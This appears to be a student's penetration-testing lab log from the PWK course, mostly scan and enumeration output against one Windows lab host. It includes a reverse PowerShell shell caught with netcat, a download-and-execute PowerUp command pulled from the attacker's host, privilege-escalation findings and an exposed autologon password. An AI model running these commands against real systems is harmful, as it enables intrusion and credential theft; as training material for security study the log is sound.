|     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
|_    	PACKETSTORM:140265	0.0	https://vulners.com/packetstorm/PACKETSTORM:140265	*EXPLOIT*
|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12
10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  java-rmi     Java RMI
49159/tcp open  java-rmi     Java RMI
Service Info: Host: 101CIAAVL; OS: Windows; CPE: cpe:/o:microsoft:windows



<font color="#FEA44C">Running Vuln scan on all ports</font>
<font color="#FEA44C">This may take a while, depending on the number of detected services..</font>



PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
1100/tcp  open  java-rmi       Java RMI
2869/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.
|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.
3306/tcp  open  mysql          MySQL (unauthorized; French)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.
|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.
5800/tcp  open  vnc-http       TightVNC (user: 101ciaavl; VNC TCP port: 5900)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
5900/tcp  open  vnc            VNC (protocol 3.8)
8014/tcp  open  http           Apache httpd
|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.
|_http-server-header: Apache
|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.
|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.
8080/tcp  open  http           Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server&apos;s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.
10243/tcp open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn&apos;t find any DOM based XSS.
|_http-stored-xss: Couldn&apos;t find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn&apos;t find any CSRF vulnerabilities.
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
49156/tcp open  msrpc          Microsoft Windows RPC
49157/tcp open  java-rmi       Java RMI
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
49159/tcp open  java-rmi       Java RMI
Service Info: Host: 101CIAAVL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false




<font color="#5EBDAB">---------------------Recon Recommendations---------------------</font>


<font color="#FEA44C">DNS Recon:</font>

host -l &quot;192.168.90.80&quot; &quot;192.168.1.1&quot; | tee &quot;recon/hostname_192.168.90.80.txt&quot;
dnsrecon -r &quot;192.168.90.0/24&quot; -n &quot;192.168.1.1&quot; | tee &quot;recon/dnsrecon_192.168.90.80.txt&quot;
dnsrecon -r 127.0.0.0/24 -n &quot;192.168.1.1&quot; | tee &quot;recon/dnsrecon-local_192.168.90.80.txt&quot;
dig -x &quot;192.168.90.80&quot; @192.168.1.1 | tee &quot;recon/dig_192.168.90.80.txt&quot;


<font color="#FEA44C">Web Servers Recon:</font>

nikto -host &quot;http://192.168.90.80:10243&quot; | tee &quot;recon/nikto_192.168.90.80_10243.txt&quot;
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e &apos;&apos; -u &quot;http://192.168.90.80:10243/FUZZ&quot; | tee &quot;recon/ffuf_192.168.90.80_10243.txt&quot;

nikto -host &quot;http://192.168.90.80:2869&quot; | tee &quot;recon/nikto_192.168.90.80_2869.txt&quot;
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e &apos;&apos; -u &quot;http://192.168.90.80:2869/FUZZ&quot; | tee &quot;recon/ffuf_192.168.90.80_2869.txt&quot;

nikto -host &quot;http://192.168.90.80:5357&quot; | tee &quot;recon/nikto_192.168.90.80_5357.txt&quot;
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e &apos;&apos; -u &quot;http://192.168.90.80:5357/FUZZ&quot; | tee &quot;recon/ffuf_192.168.90.80_5357.txt&quot;

nikto -host &quot;http://192.168.90.80:5800&quot; | tee &quot;recon/nikto_192.168.90.80_5800.txt&quot;
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e &apos;&apos; -u &quot;http://192.168.90.80:5800/FUZZ&quot; | tee &quot;recon/ffuf_192.168.90.80_5800.txt&quot;

nikto -host &quot;http://192.168.90.80:8014&quot; | tee &quot;recon/nikto_192.168.90.80_8014.txt&quot;
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e &apos;&apos; -u &quot;http://192.168.90.80:8014/FUZZ&quot; | tee &quot;recon/ffuf_192.168.90.80_8014.txt&quot;

nikto -host &quot;http://192.168.90.80:8080&quot; | tee &quot;recon/nikto_192.168.90.80_8080.txt&quot;
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e &apos;.php&apos; -u &quot;http://192.168.90.80:8080/FUZZ&quot; | tee &quot;recon/ffuf_192.168.90.80_8080.txt&quot;

nikto -host &quot;http://192.168.90.80:|_http-open-proxy: Proxy might be redirecting requests&quot; | tee &quot;recon/nikto_192.168.90.80_|_http-open-proxy: Proxy might be redirecting requests.txt&quot;
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e &apos;&apos; -u &quot;http://192.168.90.80:|_http-open-proxy: Proxy might be redirecting requests/FUZZ&quot; | tee &quot;recon/ffuf_192.168.90.80_|_http-open-proxy: Proxy might be redirecting requests.txt&quot;


<font color="#FEA44C">SMB Recon:</font>

smbmap -H &quot;192.168.90.80&quot; | tee &quot;recon/smbmap_192.168.90.80.txt&quot;
smbclient -L &quot;//192.168.90.80/&quot; -U &quot;guest&quot;% | tee &quot;recon/smbclient_192.168.90.80.txt&quot;





<font color="#FEA44C">Which commands would you like to run?</font>
All (Default), dig, dnsrecon, ffuf, host, nikto, smbclient, smbmap, Skip &lt;!&gt;

Running Default in (1)s: 


<font color="#5EBDAB">---------------------Running Recon Commands--------------------</font>


<font color="#FEA44C">Starting host scan</font>

Using domain server:
Name: 192.168.1.1
Address: 192.168.1.1#53
Aliases: 

Host 80.90.168.192.in-addr.arpa. not found: 3(NXDOMAIN)

<font color="#FEA44C">Finished host scan</font>

<font color="#FEA44C">=========================</font>

<font color="#FEA44C">Starting dnsrecon scan</font>

/usr/local/lib/python3.9/dist-packages/requests-2.20.0-py3.9.egg/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (4.0.0) doesn&apos;t match a supported version!
  warnings.warn(&quot;urllib3 ({}) or chardet ({}) doesn&apos;t match a supported &quot;
[*] Performing Reverse Lookup from 192.168.90.0 to 192.168.90.255
[+] 0 Records Found

<font color="#FEA44C">Finished dnsrecon scan</font>

<font color="#FEA44C">=========================</font>

<font color="#FEA44C">Starting dnsrecon scan</font>

/usr/local/lib/python3.9/dist-packages/requests-2.20.0-py3.9.egg/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (4.0.0) doesn&apos;t match a supported version!
  warnings.warn(&quot;urllib3 ({}) or chardet ({}) doesn&apos;t match a supported &quot;
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+] 	 PTR localhost 127.0.0.1
[+] 1 Records Found

<font color="#FEA44C">Finished dnsrecon scan</font>

<font color="#FEA44C">=========================</font>

<font color="#FEA44C">Starting dig scan</font>


; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; -x 192.168.90.80 @192.168.1.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 51933
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 59b924523358e9fc6bf5414b628f82968aa052ed867d947d (good)
;; QUESTION SECTION:
;80.90.168.192.in-addr.arpa.	IN	PTR

;; AUTHORITY SECTION:
168.192.IN-ADDR.ARPA.	86400	IN	SOA	168.192.IN-ADDR.ARPA. . 0 28800 7200 604800 86400

;; Query time: 4 msec
;; SERVER: 192.168.1.1#53(192.168.1.1) (UDP)
;; WHEN: Thu May 26 10:32:11 -03 2022
;; MSG SIZE  rcvd: 138

</pre>
<pre>
<font color="#FEA44C">Starting nikto scan</font>

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.90.80
+ Target Hostname:    192.168.90.80
+ Target Port:        8014
+ Start Time:         2022-05-26 10:36:20 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-05-26 10:42:54 (GMT-3) (394 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

<font color="#FEA44C">Finished nikto scan</font>

<font color="#FEA44C">=========================</font>

<font color="#FEA44C">Starting ffuf scan</font>


        /&apos;___\  /&apos;___\           /&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <font color="#D41919">&lt;3</font>
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.90.80:8014/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.hta                    [Status: 403, Size: 206, Words: 15, Lines: 9]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9]
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9]
admin.php               [Status: 403, Size: 211, Words: 15, Lines: 9]
aux                     [Status: 403, Size: 205, Words: 15, Lines: 9]
com1                    [Status: 403, Size: 206, Words: 15, Lines: 9]
com2                    [Status: 403, Size: 206, Words: 15, Lines: 9]
com3                    [Status: 403, Size: 206, Words: 15, Lines: 9]
con                     [Status: 403, Size: 205, Words: 15, Lines: 9]
content                 [Status: 301, Size: 242, Words: 14, Lines: 8]
Content                 [Status: 301, Size: 242, Words: 14, Lines: 8]
index.php               [Status: 403, Size: 211, Words: 15, Lines: 9]
info.php                [Status: 403, Size: 210, Words: 15, Lines: 9]
license                 [Status: 301, Size: 242, Words: 14, Lines: 8]
LICENSE                 [Status: 301, Size: 242, Words: 14, Lines: 8]
lpt1                    [Status: 403, Size: 206, Words: 15, Lines: 9]
lpt2                    [Status: 403, Size: 206, Words: 15, Lines: 9]
nul                     [Status: 403, Size: 205, Words: 15, Lines: 9]
phpinfo.php             [Status: 403, Size: 213, Words: 15, Lines: 9]
prn                     [Status: 403, Size: 205, Words: 15, Lines: 9]
reporting               [Status: 301, Size: 244, Words: 14, Lines: 8]
xmlrpc.php              [Status: 403, Size: 212, Words: 15, Lines: 9]
xmlrpc_server.php       [Status: 403, Size: 219, Words: 15, Lines: 9]
:: Progress: [4614/4614] :: Job [1/1] :: 2222 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

<font color="#FEA44C">Finished ffuf scan</font>

<font color="#FEA44C">=========================</font>

<font color="#FEA44C">Starting nikto scan</font>

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.90.80
+ Target Hostname:    192.168.90.80
+ Target Port:        8080
+ Start Time:         2022-05-26 10:42:58 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.9 (Win32) PHP/5.5.12
+ Retrieved x-powered-by header: PHP/5.5.12
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry &apos;/testmysql.php&apos; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Cookie OV1563438448 created without the httponly flag
+ Entry &apos;/PHP/&apos; in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.
+ PHP/5.5.12 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.4.9 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ Cookie OV1355538444 created without the httponly flag
+ OSVDB-3092: /php/: This might be interesting...
+ OSVDB-3233: /php/index.php: Monkey Http Daemon default PHP file found.
+ 8728 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2022-05-26 10:44:39 (GMT-3) (101 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

<font color="#FEA44C">Finished nikto scan</font>

<font color="#FEA44C">=========================</font>

<font color="#FEA44C">Starting ffuf scan</font>


        /&apos;___\  /&apos;___\           /&apos;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <font color="#D41919">&lt;3</font>
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.90.80:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd.php           [Status: 403, Size: 305, Words: 22, Lines: 11]
.htpasswd               [Status: 403, Size: 301, Words: 22, Lines: 11]
                        [Status: 200, Size: 40, Words: 3, Lines: 3]
aux                     [Status: 403, Size: 295, Words: 22, Lines: 11]
aux.php                 [Status: 403, Size: 299, Words: 22, Lines: 11]
cgi-bin/                [Status: 403, Size: 300, Words: 22, Lines: 11]
.hta.php                [Status: 403, Size: 300, Words: 22, Lines: 11]
com1                    [Status: 403, Size: 296, Words: 22, Lines: 11]
com1.php                [Status: 403, Size: 300, Words: 22, Lines: 11]
com2                    [Status: 403, Size: 296, Words: 22, Lines: 11]
com2.php                [Status: 403, Size: 300, Words: 22, Lines: 11]
com3                    [Status: 403, Size: 296, Words: 22, Lines: 11]
com3.php                [Status: 403, Size: 300, Words: 22, Lines: 11]
con                     [Status: 403, Size: 295, Words: 22, Lines: 11]
con.php                 [Status: 403, Size: 299, Words: 22, Lines: 11]
.hta                    [Status: 403, Size: 296, Words: 22, Lines: 11]
.htaccess.php           [Status: 403, Size: 305, Words: 22, Lines: 11]
.htaccess               [Status: 403, Size: 301, Words: 22, Lines: 11]
favicon.ico             [Status: 200, Size: 202575, Words: 323, Lines: 345]
index.php               [Status: 200, Size: 40, Words: 3, Lines: 3]
index.php               [Status: 200, Size: 40, Words: 3, Lines: 3]
lpt1                    [Status: 403, Size: 296, Words: 22, Lines: 11]
lpt1.php                [Status: 403, Size: 300, Words: 22, Lines: 11]
lpt2                    [Status: 403, Size: 296, Words: 22, Lines: 11]
lpt2.php                [Status: 403, Size: 300, Words: 22, Lines: 11]
nul                     [Status: 403, Size: 295, Words: 22, Lines: 11]
nul.php                 [Status: 403, Size: 299, Words: 22, Lines: 11]
php                     [Status: 301, Size: 328, Words: 21, Lines: 10]
PHP                     [Status: 301, Size: 328, Words: 21, Lines: 10]
phpmyadmin              [Status: 403, Size: 302, Words: 22, Lines: 11]
prn                     [Status: 403, Size: 295, Words: 22, Lines: 11]
Index.php               [Status: 200, Size: 40, Words: 3, Lines: 3]
robots.txt              [Status: 200, Size: 72, Words: 5, Lines: 6]
prn.php                 [Status: 403, Size: 299, Words: 22, Lines: 11]
:: Progress: [9228/9228] :: Job [1/1] :: 3360 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
</pre>


<pre><font color="#5EBDAB">┌──(</font><font color="#277FFF"><b>aluno㉿aluno</b></font><font color="#5EBDAB">)-[</font><b>~</b><font color="#5EBDAB">]</font>
<font color="#5EBDAB">└─</font><font color="#277FFF"><b>$</b></font> <font color="#5EBDAB">nc</font> <font color="#9755B3">-lnvp</font> 10030                                          
Listening on 0.0.0.0 10030
Connection received on 192.168.90.80 49709
Windows PowerShell running as user jill on 101CIAAVL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\wamp\www\PHP\fileManager\users\U2&gt;IEX(New-Object Net.WebClient).DownloadString(&apos;http://192.168.80.109:6969/PowerUp.ps1&apos;); Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 1384
ProcessId   : 5924
Name        : 5924
Check       : Process Token Privileges

ServiceName                     : wampapache
Path                            : &quot;c:\wamp\bin\apache\apache2.4.9\bin\httpd.exe
                                  &quot; -k runservice
ModifiableFile                  : C:\wamp\bin\apache\apache2.4.9\bin\httpd.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Travers
                                  e, WriteAttributes...}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : .\jill
AbuseFunction                   : Install-ServiceBinary -Name &apos;wampapache&apos;
CanRestart                      : False
Name                            : wampapache
Check                           : Modifiable Service Files

ServiceName                     : wampmysqld
Path                            : c:\wamp\bin\mysql\mysql5.6.17\bin\mysqld.exe 
                                  wampmysqld
ModifiableFile                  : C:\wamp\bin\mysql\mysql5.6.17\bin
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Travers
                                  e, WriteAttributes...}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : .\jill
AbuseFunction                   : Install-ServiceBinary -Name &apos;wampmysqld&apos;
CanRestart                      : False
Name                            : wampmysqld
Check                           : Modifiable Service Files

ServiceName                     : wampmysqld
Path                            : c:\wamp\bin\mysql\mysql5.6.17\bin\mysqld.exe 
                                  wampmysqld
ModifiableFile                  : C:\wamp\bin\mysql\mysql5.6.17\bin
ModifiableFilePermissions       : {GenericWrite, Delete, GenericExecute, Generi
                                  cRead}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : .\jill
AbuseFunction                   : Install-ServiceBinary -Name &apos;wampmysqld&apos;
CanRestart                      : False
Name                            : wampmysqld
Check                           : Modifiable Service Files

ServiceName                     : wampmysqld
Path                            : c:\wamp\bin\mysql\mysql5.6.17\bin\mysqld.exe 
                                  wampmysqld
ModifiableFile                  : C:\wamp\bin\mysql\mysql5.6.17\bin\mysqld.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Travers
                                  e, WriteAttributes...}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : .\jill
AbuseFunction                   : Install-ServiceBinary -Name &apos;wampmysqld&apos;
CanRestart                      : False
Name                            : wampmysqld
Check                           : Modifiable Service Files

DefaultDomainName    : 
DefaultUserName      : jill
DefaultPassword      : hill
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 
Check                : Registry Autologons



PS C:\wamp\www\PHP\fileManager\users\U2&gt; Get-ChildItem : Access to the path &apos;C:\ProgramData\VMware\VMware Tools\GuestPro
xyData\trusted&apos; is denied.
At line:4516 char:34
+         $XMlFiles = Get-ChildItem &lt;&lt;&lt;&lt;  -Path $AllUsers -Recurse -Include &apos;Gr
oups.xml&apos;,&apos;Services.xml&apos;,&apos;Scheduledtasks.xml&apos;,&apos;DataSources.xml&apos;,&apos;Printers.xml&apos;,
&apos;Drives.xml&apos; -Force -ErrorAction SilentlyContinue
    + CategoryInfo          : PermissionDenied: (C:\ProgramData\...oxyData\tru 
   sted:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
   Commands.GetChildItemCommand
 
</pre>

># SNMPv1 scan

(Não sei como realizei esse scan! Procurar!)

<pre>

[+] Try to connect to 192.168.90.80:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.90.80
  Hostname                      : 101ciaavl
  Description                   : Hardware: x86 Family 15 Model 6 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.1 (Build 7601 Mult
iprocessor Free)
  Contact                       : Administrator
  Location                      : PWK Lab
  Uptime snmp                   : 00:55:48.63
  Uptime system                 : 00:55:29.94
  System date                   : 2022-5-26 01:56:51.1
  Domain                        : WORKGROUP

[*] User accounts:

  jill                
  Guest               
  admin               
  Administrator       
  HomeGroupUser$    

  [*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  1                     127.0.0.1             255.0.0.0             1                   
  19                    192.168.90.80         255.255.248.0         1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               192.168.88.1          0.0.0.0               266                 
  127.0.0.0             127.0.0.1             255.0.0.0             306                 
  127.0.0.1             127.0.0.1             255.255.255.255       306                 
  127.255.255.255       127.0.0.1             255.255.255.255       306                 
  192.168.88.0          192.168.90.80         255.255.248.0         266                 
  192.168.90.80         192.168.90.80         255.255.255.255       266                 
  192.168.95.255        192.168.90.80         255.255.255.255       266                 
  224.0.0.0             127.0.0.1             240.0.0.0             306                 
  255.255.255.255       127.0.0.1             255.255.255.255       306                 

[*] TCP connections and listening ports:


.168.90.80         2869                  192.168.90.99         60486                 closeWait           
  192.168.90.80         2869                  192.168.90.99         60488                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50824                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50826                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50854                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50856                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50858                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50860                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50862                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50864                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50866                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50868                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50870                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50872                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50874                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50876                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50878                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50880                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50882                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50884                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50886                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50888                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50890                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50892                 closeWait           
  192.168.90.80         8014                  192.168.90.99         50894                 closeWait    


[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               161                 
  0.0.0.0               500                 
  0.0.0.0               3702                
  0.0.0.0               4500                
  0.0.0.0               5004                
  0.0.0.0               5005                
  0.0.0.0               5355                
  0.0.0.0               52126               
  127.0.0.1             1900                
  127.0.0.1             2638                
  127.0.0.1             50986               
  192.168.90.80         137                 
  192.168.90.80         138                 
  192.168.90.80         1900                
  192.168.90.80         50985               
  44                    Diagnostic Policy Service
  45                    Security Accounts Manager
  46                    Network Location Awareness
  47                    Symantec Embedded Database
  48                    Windows Font Cache Service
  49                    Remote Procedure Call (RPC)
  50                    DCOM Server Process Launcher
  51                    Encrypting File System (EFS)
  52                    Remote Desktop Configuration
  53                    Windows Audio Endpoint Builder
  54                    Network Store Interface Service
  55                    Distributed Link Tracking Client
  56                    System Event Notification Service
  57                    Windows Management Instrumentation
  58                    Distributed Transaction Coordinator
  59                    IKE and AuthIP IPsec Keying Modules
  60                    Symantec Endpoint Protection Manager
  61                    Desktop Window Manager Session Manager
  62                    Function Discovery Resource Publication
  63                    VMware Alias Manager and Ticket Service
  64                    WinHTTP Web Proxy Auto-Discovery Service
  65                    Windows Media Player Network Sharing Service
  66                    Symantec Endpoint Protection Manager Webserver
  67                    Remote Desktop Services UserMode Port Redirector

20                   running               smss.exe              \SystemRoot\System32\                      
  236                   running               sppsvc.exe                                                      
  260                   running               conhost.exe           \??\C:\Windows\system32\                      
  288                   running               rotatelogs.exe        C:\Program Files\Symantec\Symantec Endpoint Protection Manager\apache\bin\
  logs/error-%Z.log 100M
  296                   running               csrss.exe             %SystemRoot%\system32\  ObjectDirectory=\Windows SharedSection=1024,12288,
